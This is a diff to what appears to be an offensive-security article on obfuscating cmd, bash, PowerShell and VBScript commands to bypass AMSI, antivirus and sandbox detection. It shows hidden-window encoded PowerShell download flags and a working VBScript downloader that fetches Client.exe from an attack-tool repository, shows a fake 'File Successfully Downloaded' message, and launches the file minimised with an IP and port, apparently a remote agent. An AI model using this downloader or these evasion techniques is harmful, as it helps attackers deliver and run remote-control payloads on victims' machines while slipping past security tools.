@@ -7,14 +7,17 @@
 
       -exec bypass -win Hidden -noni -enc | -ep bypass -noni -w hidden -enc | .WebClient).DonwloadString
 
-      That and the amazing work conducted by @danielbohannon in Invoke-Obfuscation, it took me to compile
-      this article with a list of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) and
-      powershell (psh-ps1), in one attempt to bypass AV's AMSI and DEP detection mechanisms and sandbox
+      The amazing work conducted by @danielbohannon in Invoke-Obfuscation, it took me to compile this article
+      with a list of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) powershell (psh-ps1)
+      C, vbscript (vs), etc. In one attempt to bypass AV's AMSI and DEP detection mechanisms and sandbox
       evasion technics. This article does not focus in shellcode obfuscation or crypting, but only in
       system call's that are (or migth) beeing detected by security suites like microsoft's AMSI ..
 
 <br />
 
+
+**Example of one obfuscated bat agent** [ Agent.bat ]<br />
+![Batch obfuscation](https://user-images.githubusercontent.com/23490060/94740418-881dc080-036a-11eb-9b99-b72b3a4959de.png)<br />
 
 **Example of one obfuscated vbs agent** [ Agent.vbs ]<br />
 ![vbscript obfuscation](http://i.cubeupload.com/7oPCYh.png)<br />
@@ -2168,7 +2171,6 @@ Python Downloaders<br />
 <br />
 VbScript Downloaders (VBS)<br />
 
-
 ```
 ' Set your url settings and the saving options
 strFileURL = "https://github.com/r00t-3xp10it/venom/blob/master/bin/Client.exe"
@@ -2196,7 +2198,8 @@ Set objADOStream = Nothing
 End if
 
 Set objXMLHTTP = Nothing
-CreateObject("WScript.Shell").Exec "Client.exe ip=192.168.1.73 port=666"
+x=MsgBox("File Successfully Downloaded" & vbCrLf & "Storage: C:\Users\pedro\Desktop\Client.exe",64,"VBS Downloader")
+CreateObject("WScript.Shell").Exec "cmd /R start /min Client.exe ip=192.168.1.73 port=666"
 ```
 
 ---
